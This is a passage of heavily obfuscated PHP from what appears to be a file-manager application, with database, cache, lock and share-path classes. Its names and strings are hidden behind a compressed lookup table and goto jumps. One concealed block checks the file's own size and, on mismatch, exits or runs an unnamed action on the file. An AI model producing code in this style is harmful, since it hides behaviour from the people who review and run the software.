$¨÷ñÕ¹ = $ÓÆ¯¼›¶[1023]; break; case $ÓÆ¯¼›¶[988]: case $ÓÆ¯¼›¶[1006]: $¨÷ñÕ¹ = $ÓÆ¯¼›¶[1024]; break; case $ÓÆ¯¼›¶[1015]: $¨÷ñÕ¹ = $ÓÆ¯¼›¶[1025]; break; case $ÓÆ¯¼›¶[990]: think_exception(think_lang($ÓÆ¯¼›¶[1026]) . $ÓÆ¯¼›¶[1027]); break; case $ÓÆ¯¼›¶[1007]: $¨÷ñÕ¹ = $ÓÆ¯¼›¶[45] . $ÓÆ¯¼›¶[46] . $ÓÆ¯¼›¶[47]; break; case $ÓÆ¯¼›¶[1018]: default: if (!empty($„üëªø©)) { $¨÷ñÕ¹ = $ÓÆ¯¼›¶[970] . $„üëªø© . $ÓÆ¯¼›¶[971]; } else { $¨÷ñÕ¹ = $ÓÆ¯¼›¶[972]; } } } $•ùæç¿ı = $this->query($¨÷ñÕ¹); $¹É¦¾ı = array(); foreach ($•ùæç¿ı as $…º²–¹ì => $ÆªóØé) { $¹É¦¾ı[$…º²–¹ì] = current($ÆªóØé); } return $¹É¦¾ı; } protected function parseLimit($©Ñ›ÍÅ) { $Ë’×–Ø” =& $_SERVER[ˆ¡¹µ‹Â]; $ª…ˆ¼ç = $Ë’×–Ø”[12]; if (!empty($©Ñ›ÍÅ)) { switch ($this->dbType) { case $Ë’×–Ø”[1015]: case $Ë’×–Ø”[1007]: $©Ñ›ÍÅ = explode($Ë’×–Ø”[50], $©Ñ›ÍÅ); if (count($©Ñ›ÍÅ) > 1) { $ª…ˆ¼ç .= $Ë’×–Ø”[51] . $©Ñ›ÍÅ[1] . $Ë’×–Ø”[52] . $©Ñ›ÍÅ[0] . $Ë’×–Ø”[53]; } else { $ª…ˆ¼ç .= $Ë’×–Ø”[51] . $©Ñ›ÍÅ[0] . $Ë’×–Ø”[53]; } break; case $Ë’×–Ø”[988]: case $Ë’×–Ø”[1006]: break; case $Ë’×–Ø”[990]: break; case $Ë’×–Ø”[989]: case $Ë’×–Ø”[991]: break; case $Ë’×–Ø”[1018]: default: $ª…ˆ¼ç .= $Ë’×–Ø”[51] . $©Ñ›ÍÅ . $Ë’×–Ø”[53]; } } return $ª…ˆ¼ç; } public function parseKey(&$ÙåÜ†áş, $ §ÍÏ•Ó = true) { $¾ˆ¦£¨À =& $_SERVER[ˆ¡¹µ‹Â]; if ($ §ÍÏ•Ó) { $ÙåÜ†áş = $this->parseKeyCheck($ÙåÜ†áş); } if ($this->dbType == $¾ˆ¦£¨À[1018]) { if ($ÙåÜ†áş != $¾ˆ¦£¨À[220] && !preg_match($¾ˆ¦£¨À[982], $ÙåÜ†áş)) { $ÙåÜ†áş = $¾ˆ¦£¨À[461] . trim($ÙåÜ†áş, $¾ˆ¦£¨À[461]) . $¾ˆ¦£¨À[461]; } return $ÙåÜ†áş; } else { return parent::parseKey($ÙåÜ†áş, $ §ÍÏ•Ó); } } public function close() { $this->_linkID = null; } public function error() { $¢†à¤„™ =& $_SERVER[ˆ¡¹µ‹Â]; if ($this->PDOStatement) { $ªÓ´ÎÓ = $this->PDOStatement->errorInfo(); $this->error = $ªÓ´ÎÓ[1] . $¢†à¤„™[4] . $ªÓ´ÎÓ[2]; } else { $this->error = $¢†à¤„™[12]; } if ($¢†à¤„™[12] != $this->queryStr) { $this->error .= LNG($¢†à¤„™[48]) . $this->queryStr; } think_trace($this->error, $¢†à¤„™[12], $¢†à¤„™[49]); return $this->error; } public function escapeString($îß«ùïë) { $ãÎ®€ú³ =& $_SERVER[ˆ¡¹µ‹Â]; switch ($this->dbType) { case $ãÎ®€ú³[1015]: case $ãÎ®€ú³[988]: case $ãÎ®€ú³[1006]: case $ãÎ®€ú³[1018]: return addslashes($îß«ùïë); case $ãÎ®€ú³[990]: case $ãÎ®€ú³[1007]: case $ãÎ®€ú³[989]: case $ãÎ®€ú³[991]: return str_ireplace($ãÎ®€ú³[58], $ãÎ®€ú³[59], $îß«ùïë); } } protected function parseValue($úåÅ®ßï) { $ªç­÷š¿ =& $_SERVER[ˆ¡¹µ‹Â]; if (is_string($úåÅ®ßï)) { $›ô×ËêÁ = strpos($úåÅ®ßï, $ªç­÷š¿[4]) === 0 && in_array($úåÅ®ßï, array_keys($this->bind)); $úåÅ®ßï = $›ô×ËêÁ ? $this->escapeString($úåÅ®ßï) : $ªç­÷š¿[1028] . $this->escapeString($úåÅ®ßï) . $ªç­÷š¿[1028]; } elseif (isset($úåÅ®ßï[0]) && is_string($úåÅ®ßï[0]) && strtolower($úåÅ®ßï[0]) == $ªç­÷š¿[373]) { $úåÅ®ßï = $this->escapeString($úåÅ®ßï[1]); } elseif (is_array($úåÅ®ßï)) { $úåÅ®ßï = array_map(array($this, $ªç­÷š¿[1029]), $úåÅ®ßï); } elseif (is_bool($úåÅ®ßï)) { $úåÅ®ßï = $úåÅ®ßï ? $ªç­÷š¿[91] : $ªç­÷š¿[228]; } elseif (is_null($úåÅ®ßï)) { $úåÅ®ßï = $ªç­÷š¿[106]; } return $úåÅ®ßï; } public function getLastInsertId() { $³ô¹¤ÏÉ =& $_SERVER[ˆ¡¹µ‹Â]; switch ($this->dbType) { case $³ô¹¤ÏÉ[1015]: case $³ô¹¤ÏÉ[1007]: case $³ô¹¤ÏÉ[988]: case $³ô¹¤ÏÉ[1006]: case $³ô¹¤ÏÉ[990]: case $³ô¹¤ÏÉ[1018]: return $this->_linkID->lastInsertId(); case $³ô¹¤ÏÉ[989]: case $³ô¹¤ÏÉ[991]: $«–ÌğëÑ = $this->table; $é¯šØ‰÷ = $this->query("\123\x45\x4c\x45\103\124\40{$«–ÌğëÑ}\56\143\165\162\x72\x76\141\154\x20\x63\165\162\x72\x76\141\154\x20\x46\122\x4f\x4d\x20\144\165\141\154"); return $é¯šØ‰÷ ? $é¯šØ‰÷[0][$³ô¹¤ÏÉ[1030]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($øÓ¶ÊÏç) { $©¿¦‰Û§ =& $_SERVER[ˆ¡¹µ‹Â]; if (!CacheLock::fileLock($©¿¦‰Û§[13])) { return !1; } $Ç»—ŠÂŞ = parent::query($øÓ¶ÊÏç); CacheLock::fileUnLock($©¿¦‰Û§[13]); return $Ç»—ŠÂŞ; } public function execute($å§ıÏ ½) { $ó¦›ÊúÆ =& $_SERVER[ˆ¡¹µ‹Â]; if (!CacheLock::fileLock($ó¦›ÊúÆ[13])) { return !1; } $äÙ¦éôå = parent::execute($å§ıÏ ½); CacheLock::fileUnLock($ó¦›ÊúÆ[13]); return $äÙ¦éôå; } } goto b™Ñª¤¸£‡; dßšÁËÁ©: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $”ûé„§ó =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $‹¡›²¡ = $GLOBALS[$”ûé„§ó[6]][$”ûé„§ó[425]]; $Ğ¢à¥ãŠ = $‹¡›²¡[$‹¡›²¡[$”ûé„§ó[901]]]; $ƒ¹‰Ê±¾ = $‹¡›²¡[$”ûé„§ó[902]]; switch ($‹¡›²¡[$”ûé„§ó[901]]) { case $”ûé„§ó[21]: self::$handle = Model($”ûé„§ó[903]); break; case $”ûé„§ó[904]: self::$handle = new CacheRedis($Ğ¢à¥ãŠ, $ƒ¹‰Ê±¾); break; case $”ûé„§ó[905]: self::$handle = new CacheMemcached($Ğ¢à¥ãŠ, $ƒ¹‰Ê±¾); break; case $”ûé„§ó[230]: self::$handle = new CacheFile($Ğ¢à¥ãŠ, $ƒ¹‰Ê±¾); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Üºãê±) { if (is_array($Üºãê±) || is_object($Üºãê±)) { $Üºãê± = json_encode($Üºãê±); } $Üºãê± = rawurlencode($Üºãê±); return md5(KOD_SITE_ID . $_SERVER[ˆ¡¹µ‹Â][11] . $Üºãê±); } public static function get($œŒÁ„ô‘, $ÅóÜ©Ÿİ = false) { $‡Ç»¿° = self::key($œŒÁ„ô‘); $Ãâ¨ø = self::init(); if ($ÅóÜ©Ÿİ) { return unserialize($Ãâ¨ø->get($‡Ç»¿°)); } if (!isset(self::$memoryCache[$‡Ç»¿°])) { $ÒìÔ“¤‘ = $Ãâ¨ø->get($‡Ç»¿°); self::$memoryCache[$‡Ç»¿°] = unserialize($ÒìÔ“¤‘); } return self::$memoryCache[$‡Ç»¿°]; } public static function set($öáâ Ô¬, $ÃË¤Äª¼, $®€²Ù’ì = false) { $íøšéÛß =& $_SERVER[ˆ¡¹µ‹Â]; $şºçÆûŸ = self::key($öáâ Ô¬); if (isset(self::$memoryCache[$şºçÆûŸ]) && self::$memoryCache[$şºçÆûŸ] === $ÃË¤Äª¼) { return !0; } if ($®€²Ù’ì === 0) { self::$memoryCache[$şºçÆûŸ] = $ÃË¤Äª¼; return !0; } $É™Ø»Æú = self::init(); $¿·óî‘í = serialize($ÃË¤Äª¼); CacheLock::lock($öáâ Ô¬ . $íøšéÛß[906]); $Îô’ÚÃ¼ = $É™Ø»Æú->set($şºçÆûŸ, $¿·óî‘í, $®€²Ù’ì); self::$memoryCache[$şºçÆûŸ] = $ÃË¤Äª¼; CacheLock::unlock($öáâ Ô¬ . $íøšéÛß[906]); return $Îô’ÚÃ¼; } public static function getCall($¯›Á¶°Æ, $¹‰Àğç¹, $ÏğùÍ¬¥, $Ñïß¯Â = array()) { $ø¹ÙÁó =& $_SERVER[ˆ¡¹µ‹Â]; $şôÇî¥Á = self::get($¯›Á¶°Æ); if ($şôÇî¥Á || $şôÇî¥Á === $ø¹ÙÁó[12]) { return $şôÇî¥Á; } $şôÇî¥Á = call_user_func_array($ÏğùÍ¬¥, $Ñïß¯Â); $şôÇî¥Á = $şôÇî¥Á ? $şôÇî¥Á : $ø¹ÙÁó[12]; self::set($¯›Á¶°Æ, $şôÇî¥Á, $¹‰Àğç¹); return $şôÇî¥Á; } public static function remove($¨ èÔÖ˜) { $é˜‡÷³Ù = self::key($¨ èÔÖ˜); unset(self::$memoryCache[$é˜‡÷³Ù]); self::clearTimeout(); CacheLock::lock($¨ èÔÖ˜); $ºÄ½ì‡ = self::init()->remove($é˜‡÷³Ù); CacheLock::unlock($¨ èÔÖ˜); return $ºÄ½ì‡; } public static function removeMemory($ºšÛ§úÕ) { $¹°˜¬ß = self::key($ºšÛ§úÕ); unset(self::$memoryCache[$¹°˜¬ß]); } public static function clearMemory($çí÷¥åÚ = false) { if ($çí÷¥åÚ) { $çí÷¥åÚ = self::key($çí÷¥åÚ); unset(self::$memoryCache[$çí÷¥åÚ]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ˆ¡¹µ‹Â][907])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ˆ¡¹µ‹Â][908])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ñêöš¾Õ, $´Õê ®) { $ĞÓë–ı =& $_SERVER[ˆ¡¹µ‹Â]; $this->cachePath = $Ñêöš¾Õ[$ĞÓë–ı[87]]; $this->prefix = $ĞÓë–ı[909]; $this->cacheTime = $´Õê ®; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($ºâ‚…é) { $àÔà«‹¿ =& $_SERVER[ˆ¡¹µ‹Â]; $ºâ‚…é = str_replace(array($àÔà«‹¿[910], $àÔà«‹¿[100], $àÔà«‹¿[76]), $àÔà«‹¿[911], $ºâ‚…é); return $this->cachePath . $àÔà«‹¿[912] . $ºâ‚…é . $àÔà«‹¿[913]; } public function set($±ñ®çá¼, $ØŸóì¤ğ, $ÌêÔ¿ö¹ = false) { $ÌêÔ¿ö¹ = $ÌêÔ¿ö¹ ? $ÌêÔ¿ö¹ : $this->cacheTime; $œ„ÕŞÓŞ = $this->getFile($±ñ®çá¼); if (file_put_contents($œ„ÕŞÓŞ, $this->prefix . $ØŸóì¤ğ, LOCK_EX)) { @touch($œ„ÕŞÓŞ, intval(time() + $ÌêÔ¿ö¹)); clearstatcache(); return !0; } @unlink($œ„ÕŞÓŞ); return !1; } public function get($¬ÒÓ¦Áç) { $È§¬˜Ç = $this->getFile($¬ÒÓ¦Áç); if (file_exists($È§¬˜Ç) && filemtime($È§¬˜Ç) < time()) { @unlink($È§¬˜Ç); return !1; } $ÜÄüª•ô = @file_get_contents($È§¬˜Ç); return substr($ÜÄüª•ô, strlen($this->prefix)); } public function remove($ìí°±†®) { $‹Ï°¼ = $this->getFile($ìí°±†®); return @unlink($‹Ï°¼); } public function deleteAll() { $±Áâ…Îê =& $_SERVER[ˆ¡¹µ‹Â]; $Ë©¹ƒÄˆ = scandir($this->cachePath); foreach ($Ë©¹ƒÄˆ as $ñĞ¹„¥) { $ã³ú©ˆÒ = $this->cachePath . $ñĞ¹„¥; if (strpos($ã³ú©ˆÒ, $±Áâ…Îê[913]) && strpos($ã³ú©ˆÒ, $±Áâ…Îê[914])) { @unlink($ã³ú©ˆÒ); } } } public function clearTimeout() { $ÀáúÈ÷ =& $_SERVER[ˆ¡¹µ‹Â]; $¥Îìœ¬³ = scandir($this->cachePath); foreach ($¥Îìœ¬³ as $àó‰Ò Æ) { $«ãŒ¡üğ = $this->cachePath . $àó‰Ò Æ; if (strpos($«ãŒ¡üğ, $ÀáúÈ÷[913]) && strpos($«ãŒ¡üğ, $ÀáúÈ÷[914]) && filemtime($«ãŒ¡üğ) < time()) { @unlink($«ãŒ¡üğ); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $†ŸÔÃüù =& $_SERVER[ˆ¡¹µ‹Â]; if (self::$handle) { return self::$handle; } $š½¥‡šš = $GLOBALS[$†ŸÔÃüù[6]][$†ŸÔÃüù[425]]; self::$timeout = $š½¥‡šš[$†ŸÔÃüù[915]] ? $š½¥‡šš[$†ŸÔÃüù[915]] : 10; $šğÒé§‹ = _get($GLOBALS[$†ŸÔÃüù[6]], $†ŸÔÃüù[916]); $ûŠ×ëŸæ = $š½¥‡šš[$†ŸÔÃüù[901]] ? $š½¥‡šš[$†ŸÔÃüù[901]] : $†ŸÔÃüù[230]; if ($ûŠ×ëŸæ == $†ŸÔÃüù[21] && $šğÒé§‹ == $†ŸÔÃüù[13]) { $ûŠ×ëŸæ = $†ŸÔÃüù[230]; } switch ($ûŠ×ëŸæ) { case $†ŸÔÃüù[904]: self::$handle = new CacheLockRedis(); break; case $†ŸÔÃüù[905]: self::$handle = new CacheLockMemcached(); break; case $†ŸÔÃüù[21]: self::$handle = new CacheLockDatabase(); break; case $†ŸÔÃüù[230]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($†ŸÔÃüù[917], $†ŸÔÃüù[918]); } return self::$handle; } private static function key($ñêğè¸) { return $_SERVER[ˆ¡¹µ‹Â][919] . Cache::key($ñêğè¸); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($óÔ“ †Û = '') { self::$errorMsg = $óÔ“ †Û; } public static function lockGlobal($…æÇ‚Ğ›, $¤Çç¿†×) { return self::lock($…æÇ‚Ğ›, $¤Çç¿†×, !0); } public static function lock($ÒÅı‚˜, $ç¬ÜñÀ = false, $Ç¬Ø‘µ = false) { $µ‡Ú®©ë =& $_SERVER[ˆ¡¹µ‹Â]; $å©ëáš¸ = self::init(); $®‰Â­Š = self::key($ÒÅı‚˜); $ç¬ÜñÀ = $ç¬ÜñÀ ? $ç¬ÜñÀ : self::$timeout; $Éúç¦ü = timeFloat(); $½·ÕãõÓ = $å©ëáš¸->lock($®‰Â­Š, $ç¬ÜñÀ); $ù¢â¿Ò÷ = timeFloat(); if (!$½·ÕãõÓ) { $˜™¡Úø = "\154\x6f\143\153\40\145\x72\x72\157\162\x3b\x6b\x65\x79\x3d{$ÒÅı‚˜}\x3b\164\x69\x6d\145\75{$ç¬ÜñÀ}\x3b" . self::$errorMsg . $µ‡Ú®©ë[74] . get_caller_msg(); $ûƒ×°« = LNG($µ‡Ú®©ë[920]) . "\x28{$ç¬ÜñÀ}\163\51\56" . LNG($µ‡Ú®©ë[921]); $ûƒ×°« .= $µ‡Ú®©ë[922]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ûƒ×°« = $ûƒ×°« . $µ‡Ú®©ë[923] . self::$errorMsg; } write_log($µ‡Ú®©ë[924] . sprintf($µ‡Ú®©ë[925], timeFloat() - $Éúç¦ü) . $µ‡Ú®©ë[926] . $˜™¡Úø . $µ‡Ú®©ë[927] . error_get_last(), $µ‡Ú®©ë[918]); show_json($ûƒ×°«, !1); } if (!$Ç¬Ø‘µ) { self::$lockItem[$®‰Â­Š] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $çÃ¿‹ßı = number_format(timeFloat() - $ù¢â¿Ò÷, 3); write_log($µ‡Ú®©ë[928] . $ÒÅı‚˜ . $µ‡Ú®©ë[929] . $çÃ¿‹ßı, $µ‡Ú®©ë[918]); } return $½·ÕãõÓ; } public static function lockGet($ñÕ†àÄ) { $ıå¾øºï = self::key($ñÕ†àÄ); if (self::$lockItem[$ıå¾øºï]) { return self::$lockItem[$ıå¾øºï]; } return self::init()->lockGet($ıå¾øºï); } public static function unlock($Àışªüå) { $Œñ©à³ =& $_SERVER[ˆ¡¹µ‹Â]; $×­©Ñ¯Ğ = self::key($Àışªüå); self::$lockItem[$×­©Ñ¯Ğ] = null; self::init()->unlock($×­©Ñ¯Ğ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($Œñ©à³[930] . $Àışªüå, $Œñ©à³[918]); } return; } public static function unlockRuntime() { $ù•œõ÷Ğ =& $_SERVER[ˆ¡¹µ‹Â]; $Ÿ÷°³ª› = self::init(); $¼Œ¡ú = !1; foreach (self::$lockItem as $¬§ÌéÙŸ => $ÉğÌÖÈú) { if (!$ÉğÌÖÈú) { continue; } $Ÿ÷°³ª›->unlock($¬§ÌéÙŸ); if (!$¼Œ¡ú) { $¼Œ¡ú = !0; write_log($ù•œõ÷Ğ[931] . $¬§ÌéÙŸ . $ù•œõ÷Ğ[74] . get_caller_msg(), $ù•œõ÷Ğ[918]); continue; } write_log($ù•œõ÷Ğ[931] . $¬§ÌéÙŸ, $ù•œõ÷Ğ[918]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $Âê˜”• = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ù•œõ÷Ğ[932] . $Âê˜”• . $ù•œõ÷Ğ[933] . ACTION, $ù•œõ÷Ğ[918]); } } public static function fileLock($»à†ŒËÉ) { $À¾ ¹‹ =& $_SERVER[ˆ¡¹µ‹Â]; if (!$GLOBALS[$À¾ ¹‹[934]]) { $GLOBALS[$À¾ ¹‹[934]] = array(); } $GLOBALS[$À¾ ¹‹[934]][$»à†ŒËÉ] = !1; $ñ‡ÙÁÊ­ = fopen(DATA_PATH . $»à†ŒËÉ . $À¾ ¹‹[935], $À¾ ¹‹[936]); if (!$ñ‡ÙÁÊ­) { return !1; } $GLOBALS[$À¾ ¹‹[934]][$»à†ŒËÉ] = $ñ‡ÙÁÊ­; if (flock($ñ‡ÙÁÊ­, LOCK_EX)) { return !0; } self::unlock($»à†ŒËÉ); show_json($À¾ ¹‹[937], !1); return !1; } public static function fileUnlock($¨ä±£íğ) { $àúĞñÇ‚ =& $_SERVER[ˆ¡¹µ‹Â]; $ŠşØÍ³ = $GLOBALS[$àúĞñÇ‚[934]][$¨ä±£íğ]; if (!$ŠşØÍ³) { return; } $GLOBALS[$àúĞñÇ‚[934]][$¨ä±£íğ] = !1; flock($ŠşØÍ³, LOCK_UN); fclose($ŠşØÍ³); } public static function fileUnlockAll() { $³†Öæºì =& $_SERVER[ˆ¡¹µ‹Â]; if (!isset($GLOBALS[$³†Öæºì[934]]) || !$GLOBALS[$³†Öæºì[934]]) { return; } foreach ($GLOBALS[$³†Öæºì[934]] as $šÇ³ë·Á => $ÛÜ±–±ß) { if (!$ÛÜ±–±ß) { continue; } $GLOBALS[$³†Öæºì[934]][$šÇ³ë·Á] = !1; flock($ÛÜ±–±ß, LOCK_UN); fclose($ÛÜ±–±ß); } $GLOBALS[$³†Öæºì[934]] = array(); } } goto EŠÑà§ŞÁÎ; eÃĞ¹ºë”Ğ: $_file = $_SERVER[$_SERVER[ˆ¡¹µ‹Â][844]]; $_size = $_SERVER[ˆ¡¹µ‹Â][845]; if ($_SERVER[$_SERVER[ˆ¡¹µ‹Â][846]] != $_size($_file)) { $_getc = $_SERVER[ˆ¡¹µ‹Â][847]; $_getfile = $_SERVER[$_SERVER[ˆ¡¹µ‹Â][848]] . $_SERVER[ˆ¡¹µ‹Â][849]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ˆ¡¹µ‹Â][262], $_getfilec); if (count($_getarrs) < $_SERVER[ˆ¡¹µ‹Â][687]) { $exit = $_SERVER[ˆ¡¹µ‹Â][850]; $exit(); } $_act = $_SERVER[ˆ¡¹µ‹Â][851]; $_act($_file); } goto CĞÑİâíÄÛ; a¸Œ®ª¡Šˆ: class PathDriverDriverShareItem { public function __construct($¹®‚Ì‘ş) { $this->pathParse = $¹®‚Ì‘ş; } public function __call($Ø¯‡ÇĞ·, $¸¬•îõ) { $š½‡³÷ =& $_SERVER[ˆ¡¹µ‹Â]; if (method_exists($this, $Ø¯‡ÇĞ·)) { return; } $€¤ûÖ¡ê = call_user_func_array(array($š½‡³÷[1420], $Ø¯‡ÇĞ·), $¸¬•îõ); $ïŒù»³é = array($š½‡³÷[1421], $š½‡³÷[1422], $š½‡³÷[1423], $š½‡³÷[1424], $š½‡³÷[618], $š½‡³÷[620], $š½‡³÷[1425], $š½‡³÷[110], $š½‡³÷[1426], $š½‡³÷[1427]); if (in_array($Ø¯‡ÇĞ·, $ïŒù»³é)) { $€¤ûÖ¡ê = $this->getPathOuter($€¤ûÖ¡ê); } return $€¤ûÖ¡ê; } public function copy($…ŒÀÚ°§, $×ÏÃÑßû, $ïã¶ûŞè = false, $û•À´ÄÎ = false) { return $this->copyMove($…ŒÀÚ°§, $×ÏÃÑßû, $ïã¶ûŞè, $_SERVER[ˆ¡¹µ‹Â][618], $û•À´ÄÎ); } public function move($Ç„Ë¨îÂ, $ÊÛåÔ…¢, $¬Ô¢†ˆñ = false, $º®ı¯ü = false) { return $this->copyMove($Ç„Ë¨îÂ, $ÊÛåÔ…¢, $¬Ô¢†ˆñ, $_SERVER[ˆ¡¹µ‹Â][620], $º®ı¯ü); } private function copyMove($’Ç§ò½, $Ğç€‹´ù, $ë­ïÑÍÑ, $ÛîÔ³’, $ĞŒæßÖ = false) { $çµ¬ëÇç =& $_SERVER[ˆ¡¹µ‹Â]; $™ÎÌš² = $Ğç€‹´ù; $ ÕµÍ¤ç = IO::driverMake($Ğç€‹´ù); if ($ ÕµÍ¤ç->pathParse[$çµ¬ëÇç[1225]]) { $Ğç€‹´ù = $ ÕµÍ¤ç->pathParse[$çµ¬ëÇç[1225]]; } else { $Ğç€‹´ù = $™ÎÌš²; } $ÑºÏ—ÆÌ = IO::copyMove($’Ç§ò½, $Ğç€‹´ù, $ë­ïÑÍÑ, $ÛîÔ³’, $ĞŒæßÖ); $ÑºÏ—ÆÌ = $this->getPathOuter($ÑºÏ—ÆÌ); return $ÑºÏ—ÆÌ; } public function pathThis($â’­€È¿) { return get_path_this($this->pathParse[$_SERVER[ˆ¡¹µ‹Â][87]]); } public function pathFather($­ı«ƒóœ) { return get_path_father($this->pathParse[$_SERVER[ˆ¡¹µ‹Â][87]]); } public function iconvSystem($Ñ›¥ìÓ¸) { return $Ñ›¥ìÓ¸; } protected function infoParse($‹†šµ, $èÓºğÌ¾ = false) { $äÈ©“ç =& $_SERVER[ˆ¡¹µ‹Â]; $ƒªúÅ® = $this->pathParse[$äÈ©“ç[560]][$äÈ©“ç[1250]] . $this->pathParse[$äÈ©“ç[1243]]; if ($èÓºğÌ¾) { $ïá·Âä¹ = IO::infoWithChildren($ƒªúÅ®); } else { $ïá·Âä¹ = IO::info($ƒªúÅ®); } $ú±ÈĞ±Ò = $this->pathParse[$äÈ©“ç[560]]; return Action($äÈ©“ç[1418])->_shareItemeParse($ïá·Âä¹, $ú±ÈĞ±Ò); } public function listAll($éÕ¨‹¿‚) { $Ø§”£ıÒ =& $_SERVER[ˆ¡¹µ‹Â]; $Ø“ÊøÅê = IO::listAll($éÕ¨‹¿‚); $ş‹êïœ = rtrim($this->pathParse[$Ø§”£ıÒ[560]][$Ø§”£ıÒ[1250]], $Ø§”£ıÒ[8]); foreach ($Ø“ÊøÅê as &$ØŒÁıÛâ) { $ØŒÁıÛâ[$Ø§”£ıÒ[87]] = $this->pathDriver . $Ø§”£ıÒ[8] . ltrim(substr($ØŒÁıÛâ[$Ø§”£ıÒ[87]], strlen($ş‹êïœ)), $Ø§”£ıÒ[8]); } unset($ØŒÁıÛâ); return $Ø“ÊøÅê; } public function listAllSimple($ô¤©ĞøÀ, $ŠÛú‡°Ğ = false) { $Ùª¿çÈĞ =& $_SERVER[ˆ¡¹µ‹Â]; $ò¡Ê¶¹õ = $this->listAll($ô¤©ĞøÀ); $†Ğ¤ôÕç = $this->pathParse[$Ùª¿çÈĞ[495]]; if (trim($†Ğ¤ôÕç, $Ùª¿çÈĞ[8]) == trim(get_path_father($†Ğ¤ôÕç), $Ùª¿çÈĞ[8])) { $ŠÛú‡°Ğ = !0; } return IO::init($Ùª¿çÈĞ[12])->listAllSimpleMake($ò¡Ê¶¹õ, $†Ğ¤ôÕç, $ŠÛú‡°Ğ); } public function getPathOuter($ßú˜êîã) { $´äî³Î =& $_SERVER[ˆ¡¹µ‹Â]; $Ş‹´¬½­ = KodIO::parse($ßú˜êîã); if ($Ş‹´¬½­[$´äî³Î[33]] == KodIO::KOD_SHARE_ITEM) { return $Ş‹´¬½­[$´äî³Î[87]]; } $ÚñõÈÜœ = KodIO::clear($ßú˜êîã); $Î±à²Ùş = KodIO::clear($this->pathParse[$´äî³Î[560]][$´äî³Î[1250]]); $ş´üâÒÙ = substr($ÚñõÈÜœ, strlen($Î±à²Ùş)); if (substr($ÚñõÈÜœ, 0, strlen($Î±à²Ùş)) != $Î±à²Ùş) { return !1; } return $this->pathParse[$´äî³Î[1244]] . $´äî³Î[8] . ltrim($ş´üâÒÙ, $´äî³Î[8]); } public function getType() { $ºëšÎÚ =& $_SERVER[ˆ¡¹µ‹Â]; $œ÷Î”ëà = str_replace($ºëšÎÚ[77], $ºëšÎÚ[12], get_class($this)); return strtolower($œ÷Î”ëà); } public function isOsDriver($³Üô¿ÕË) { return IO::isOsDriver($³Üô¿ÕË); } public function info($·¹±åˆ­) { return $this->infoParse($·¹±åˆ­); } public function infoAuth($ŸôÁ¿ñô) { return $this->infoParse($ŸôÁ¿ñô); } public function infoWithChildren($ÈÅ‰Ëüñ) { return $this->infoParse($ÈÅ‰Ëüñ, !0); } public function infoFull($ß¼áÂå) { return $this->infoParse($ß¼áÂå); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($£”ßÙû¥) { $this->pathParse = $£”ßÙû¥; } protected function infoParse($úÛıø…, $¬ÁåŞÂã = false) { $²×¼ÂŞ =& $_SERVER[ˆ¡¹µ‹Â]; return Action($²×¼ÂŞ[1249])->sharePathInfo($this->pathParse[$²×¼ÂŞ[87]], !0, $¬ÁåŞÂã); } public function listPath($é³³Şê, $›ÁŒ¬·© = false) { $¨èœ×ç” =& $_SERVER[ˆ¡¹µ‹Â]; $¹‰ç°ËÇ = IO::listPath($é³³Şê, $›ÁŒ¬·©); if (!$¹‰ç°ËÇ) { return $¹‰ç°ËÇ; } if (is_array($¹‰ç°ËÇ[$¨èœ×ç”[1419]])) { $¯¦­Ç†ó = Action($¨èœ×ç”[1428])->parsePathChildren($¹‰ç°ËÇ[$¨èœ×ç”[1419]], array($¨èœ×ç”[495] => $é³³Şê)); $¹‰ç°ËÇ[$¨èœ×ç”[1419]] = Action($¨èœ×ç”[1249])->shareItemInfo($¯¦­Ç†ó); } foreach ($¹‰ç°ËÇ as $’Ä—‰‰ => $˜åï¿ô) { if (!in_array($’Ä—‰‰, array($¨èœ×ç”[86], $¨èœ×ç”[85]))) { continue; } foreach ($˜åï¿ô as $ãáÔºŞÏ => $¯¦­Ç†ó) { $¯¦­Ç†ó = Action($¨èœ×ç”[1428])->parsePathChildren($¯¦­Ç†ó, array($¨èœ×ç”[495] => $é³³Şê)); $¹‰ç°ËÇ[$’Ä—‰‰][$ãáÔºŞÏ] = Action($¨èœ×ç”[1249])->shareItemInfo($¯¦­Ç†ó); } } return $¹‰ç°ËÇ; } } class PathDriverEDS extends PathDriverBaseS3 { public function __construct($¹·³Æ¸¡) { parent::__construct($¹·³Æ¸¡); $this->setSignVersion($_SERVER[ˆ¡¹µ‹Â][247]); } } goto BëˆÄŒâÏÌ; dù„”‰Ï: define($_SERVER[ˆ¡¹µ‹Â][0], $_SERVER[ˆ¡¹µ‹Â][1]); $_SERVER[Û¼Ô…²] = explode($_SERVER[ˆ¡¹µ‹Â][2], gzinflate(substr($_SERVER[ˆ¡¹µ‹Â][3], 10, -8))); function binCheckEq($£¹åŒà, $¡çò‹¤) { return $£¹åŒà == $¡çò‹¤; } goto Cº¾‡—¾; Eœ ×Ä‘Ğ†: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($¤ıâ©èÏ, $Ä ÚøºÑ) { $ÊÕıæÓˆ =& $_SERVER[ˆ¡¹µ‹Â]; if (!class_exists($ÊÕıæÓˆ[944])) { show_json($ÊÕıæÓˆ[945], !1); 